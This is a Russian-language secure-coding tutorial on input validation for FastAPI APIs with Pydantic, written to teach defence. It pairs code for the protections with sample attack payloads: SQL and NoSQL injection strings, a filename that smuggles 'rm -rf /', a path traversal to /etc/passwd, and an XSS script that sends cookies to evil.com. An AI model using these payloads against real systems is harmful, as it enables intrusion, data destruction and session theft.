# Валидация входных данных (Input Validation)

## Зачем нужна валидация?

Валидация входных данных — первая линия защиты API от:

- **SQL Injection** — внедрение SQL-кода
- **XSS (Cross-Site Scripting)** — внедрение JavaScript
- **Command Injection** — выполнение системных команд
- **Path Traversal** — доступ к файлам вне разрешённых директорий
- **Buffer Overflow** — переполнение буфера
- **Business Logic Attacks** — нарушение бизнес-логики

**Золотое правило:** Никогда не доверяйте данным от клиента!

---

## Типы валидации

### 1. Синтаксическая валидация

Проверка формата и типа данных.

```python
from pydantic import BaseModel, EmailStr, Field, validator
from datetime import date
import re

class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: EmailStr
    age: int = Field(..., ge=18, le=120)
    password: str = Field(..., min_length=8, max_length=128)

    @validator('username')
    def username_alphanumeric(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must be alphanumeric')
        return v

    @validator('password')
    def password_strength(cls, v):
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain uppercase letter')
        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain lowercase letter')
        if not re.search(r'\d', v):
            raise ValueError('Password must contain digit')
        return v
```

### 2. Семантическая валидация

Проверка смысла и бизнес-правил.

```python
from datetime import datetime

class OrderCreate(BaseModel):
    product_id: str
    quantity: int = Field(..., ge=1, le=100)
    delivery_date: date

    @validator('delivery_date')
    def delivery_date_in_future(cls, v):
        if v < date.today():
            raise ValueError('Delivery date must be in the future')
        if v > date.today() + timedelta(days=365):
            raise ValueError('Delivery date too far in the future')
        return v

class BookingCreate(BaseModel):
    start_date: datetime
    end_date: datetime

    @root_validator
    def check_dates(cls, values):
        start = values.get('start_date')
        end = values.get('end_date')
        if start and end and start >= end:
            raise ValueError('End date must be after start date')
        return values
```

### 3. Бизнес-валидация

Проверка в контексте бизнес-логики (требует доступа к БД).

```python
async def validate_order(order: OrderCreate, db: Database):
    # Проверяем существование продукта
    product = await db.get_product(order.product_id)
    if not product:
        raise HTTPException(status_code=400, detail="Product not found")

    # Проверяем наличие на складе
    if product.stock < order.quantity:
        raise HTTPException(
            status_code=400,
            detail=f"Not enough stock. Available: {product.stock}"
        )

    # Проверяем лимиты пользователя
    user_orders_today = await db.count_user_orders_today(current_user.id)
    if user_orders_today >= 10:
        raise HTTPException(status_code=400, detail="Daily order limit exceeded")
```

---

## Валидация в FastAPI с Pydantic

### Базовые типы и ограничения

```python
from pydantic import BaseModel, Field, constr, conint, confloat, conlist
from typing import Optional, List
from enum import Enum

class Status(str, Enum):
    PENDING = "pending"
    ACTIVE = "active"
    COMPLETED = "completed"

class Product(BaseModel):
    # Строка с ограничениями
    name: constr(min_length=1, max_length=100, strip_whitespace=True)

    # Число с ограничениями
    price: confloat(gt=0, le=1000000)
    quantity: conint(ge=0, le=10000)

    # Enum - только допустимые значения
    status: Status

    # Список с ограничениями
    tags: conlist(str, min_items=0, max_items=10)

    # Опциональные поля с default
    description: Optional[str] = Field(None, max_length=1000)

    class Config:
        # Запрещаем дополнительные поля
        extra = "forbid"
```

### Кастомные валидаторы

```python
from pydantic import validator, root_validator
import re

class PaymentRequest(BaseModel):
    card_number: str
    cvv: str
    expiry_month: int
    expiry_year: int
    amount: float

    @validator('card_number')
    def validate_card_number(cls, v):
        # Удаляем пробелы и дефисы
        cleaned = re.sub(r'[\s-]', '', v)

        # Проверяем формат
        if not cleaned.isdigit() or len(cleaned) not in (15, 16):
            raise ValueError('Invalid card number format')

        # Алгоритм Луна
        if not cls._luhn_check(cleaned):
            raise ValueError('Invalid card number')

        return cleaned

    @validator('cvv')
    def validate_cvv(cls, v):
        if not v.isdigit() or len(v) not in (3, 4):
            raise ValueError('CVV must be 3-4 digits')
        return v

    @validator('expiry_month')
    def validate_month(cls, v):
        if not 1 <= v <= 12:
            raise ValueError('Invalid expiry month')
        return v

    @root_validator
    def check_expiry(cls, values):
        month = values.get('expiry_month')
        year = values.get('expiry_year')

        if month and year:
            from datetime import date
            today = date.today()

            if year < today.year or (year == today.year and month < today.month):
                raise ValueError('Card has expired')

        return values

    @staticmethod
    def _luhn_check(card_number: str) -> bool:
        digits = [int(d) for d in card_number]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]

        total = sum(odd_digits)
        for d in even_digits:
            total += sum(divmod(d * 2, 10))

        return total % 10 == 0
```

---

## Защита от типичных атак

### 1. SQL Injection

**Атака:**
```json
{
  "username": "admin'; DROP TABLE users; --"
}
```

**Защита: Параметризованные запросы**

```python
# ПЛОХО: Конкатенация строк
query = f"SELECT * FROM users WHERE username = '{username}'"

# ХОРОШО: Параметризованный запрос
query = "SELECT * FROM users WHERE username = $1"
result = await db.fetch_one(query, username)

# ХОРОШО: ORM (SQLAlchemy)
user = await session.execute(
    select(User).where(User.username == username)
)
```

### 2. NoSQL Injection

**Атака:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

**Защита:**

```python
from pydantic import BaseModel, validator

class LoginRequest(BaseModel):
    username: str
    password: str

    @validator('username', 'password')
    def must_be_string(cls, v):
        if not isinstance(v, str):
            raise ValueError('Must be a string')
        return v

# Дополнительно: проверка типов перед запросом
async def authenticate(data: LoginRequest):
    # Pydantic гарантирует, что это строки
    user = await db.users.find_one({
        "username": data.username  # Безопасно!
    })
```

### 3. Command Injection

**Атака:**
```json
{
  "filename": "file.txt; rm -rf /"
}
```

**Защита:**

```python
import subprocess
import shlex
import re

# ПЛОХО
def convert_file(filename: str):
    os.system(f"convert {filename} output.pdf")

# ХОРОШО: Валидация + безопасный subprocess
def convert_file_safe(filename: str):
    # Строгая валидация имени файла
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        raise ValueError("Invalid filename")

    # Проверка расширения
    allowed_extensions = {'.txt', '.doc', '.docx'}
    if not any(filename.endswith(ext) for ext in allowed_extensions):
        raise ValueError("Invalid file type")

    # Безопасный вызов (список аргументов, не строка)
    subprocess.run(
        ['convert', filename, 'output.pdf'],
        check=True,
        capture_output=True,
        timeout=30
    )
```

### 4. Path Traversal

**Атака:**
```json
{
  "filename": "../../../etc/passwd"
}
```

**Защита:**

```python
import os
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads")

def get_file_safe(filename: str) -> Path:
    # Валидация имени файла
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        raise ValueError("Invalid filename")

    # Построение пути
    file_path = UPLOAD_DIR / filename

    # Проверка, что путь внутри UPLOAD_DIR
    try:
        file_path = file_path.resolve()
        file_path.relative_to(UPLOAD_DIR.resolve())
    except ValueError:
        raise ValueError("Access denied: path traversal detected")

    if not file_path.exists():
        raise FileNotFoundError("File not found")

    return file_path

# FastAPI эндпоинт
@app.get("/files/{filename}")
async def download_file(filename: str):
    try:
        file_path = get_file_safe(filename)
        return FileResponse(file_path)
    except (ValueError, FileNotFoundError) as e:
        raise HTTPException(status_code=404, detail="File not found")
```

### 5. XSS через входные данные

**Атака:**
```json
{
  "bio": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
}
```

**Защита:**

```python
import html
import bleach

# Экранирование HTML
def sanitize_html(text: str) -> str:
    return html.escape(text)

# Или разрешение только безопасных тегов
def sanitize_rich_text(text: str) -> str:
    allowed_tags = ['b', 'i', 'u', 'p', 'br', 'a']
    allowed_attrs = {'a': ['href']}
    return bleach.clean(
        text,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True
    )

class UserProfile(BaseModel):
    bio: str = Field(..., max_length=500)

    @validator('bio')
    def sanitize_bio(cls, v):
        # Удаляем HTML теги
        return bleach.clean(v, tags=[], strip=True)
```

---

## Валидация файлов

```python
from fastapi import UploadFile, HTTPException
import magic  # python-magic
import hashlib

ALLOWED_MIME_TYPES = {
    'image/jpeg': ['.jpg', '.jpeg'],
    'image/png': ['.png'],
    'application/pdf': ['.pdf'],
}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

async def validate_file(file: UploadFile) -> bytes:
    # 1. Проверка размера
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(
            status_code=400,
            detail=f"File too large. Max size: {MAX_FILE_SIZE // 1024 // 1024}MB"
        )

    # 2. Проверка MIME type по содержимому (не по расширению!)
    mime_type = magic.from_buffer(content, mime=True)
    if mime_type not in ALLOWED_MIME_TYPES:
        raise HTTPException(
            status_code=400,
            detail=f"File type not allowed: {mime_type}"
        )

    # 3. Проверка расширения файла
    file_ext = Path(file.filename).suffix.lower()
    if file_ext not in ALLOWED_MIME_TYPES[mime_type]:
        raise HTTPException(
            status_code=400,
            detail="File extension doesn't match content"
        )

    # 4. Проверка на опасное содержимое (для изображений)
    if mime_type.startswith('image/'):
        try:
            from PIL import Image
            import io
            Image.open(io.BytesIO(content)).verify()
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid image file")

    # Сброс указателя для дальнейшего использования
    await file.seek(0)
    return content

@app.post("/upload")
async def upload_file(file: UploadFile):
    content = await validate_file(file)

    # Генерируем безопасное имя файла
    file_hash = hashlib.sha256(content).hexdigest()[:16]
    safe_filename = f"{file_hash}{Path(file.filename).suffix}"

    # Сохраняем
    async with aiofiles.open(UPLOAD_DIR / safe_filename, 'wb') as f:
        await f.write(content)

    return {"filename": safe_filename}
```

---

## Валидация JSON Schema

Для сложных структур можно использовать JSON Schema.

```python
from jsonschema import validate, ValidationError
from fastapi import HTTPException

# JSON Schema для сложной структуры
ORDER_SCHEMA = {
    "type": "object",
    "required": ["items", "shipping_address"],
    "properties": {
        "items": {
            "type": "array",
            "minItems": 1,
            "maxItems": 100,
            "items": {
                "type": "object",
                "required": ["product_id", "quantity"],
                "properties": {
                    "product_id": {"type": "string", "pattern": "^[A-Z0-9]{8}$"},
                    "quantity": {"type": "integer", "minimum": 1, "maximum": 100}
                }
            }
        },
        "shipping_address": {
            "type": "object",
            "required": ["street", "city", "zip"],
            "properties": {
                "street": {"type": "string", "maxLength": 200},
                "city": {"type": "string", "maxLength": 100},
                "zip": {"type": "string", "pattern": "^[0-9]{5,6}$"}
            }
        }
    },
    "additionalProperties": False
}

@app.post("/orders")
async def create_order(request: Request):
    try:
        data = await request.json()
        validate(data, ORDER_SCHEMA)
    except ValidationError as e:
        raise HTTPException(status_code=400, detail=str(e.message))

    # Продолжаем обработку...
```

---

## Централизованная обработка ошибок валидации

```python
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from fastapi.exceptions import RequestValidationError

app = FastAPI()

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    errors = []
    for error in exc.errors():
        errors.append({
            "field": ".".join(str(loc) for loc in error["loc"]),
            "message": error["msg"],
            "type": error["type"]
        })

    return JSONResponse(
        status_code=422,
        content={
            "detail": "Validation error",
            "errors": errors
        }
    )
```

---

## Best Practices

1. **Валидируйте на входе, не на выходе** — данные должны быть чистыми до обработки
2. **Whitelist, не Blacklist** — разрешайте только известные хорошие значения
3. **Не доверяйте клиенту** — валидируйте ВСЁ, включая заголовки
4. **Типизация** — используйте строгие типы (Pydantic, TypedDict)
5. **Ограничивайте размеры** — max_length, max_items, max file size
6. **Проверяйте контекст** — пользователь может редактировать только свои данные
7. **Логируйте ошибки валидации** — для обнаружения атак
8. **Не раскрывайте лишнего** — не показывайте детали ошибок в production

---

## Чек-лист валидации

- [ ] Все входные данные проходят через Pydantic модели
- [ ] Установлены ограничения на длину строк
- [ ] Числа имеют минимальные и максимальные значения
- [ ] Используются Enum для ограниченного набора значений
- [ ] Запрещены дополнительные поля (`extra = "forbid"`)
- [ ] Файлы проверяются по MIME type, не по расширению
- [ ] SQL запросы параметризованы
- [ ] Системные команды не формируются из пользовательских данных
- [ ] Пути к файлам проверяются на path traversal
- [ ] Настроена централизованная обработка ошибок валидации
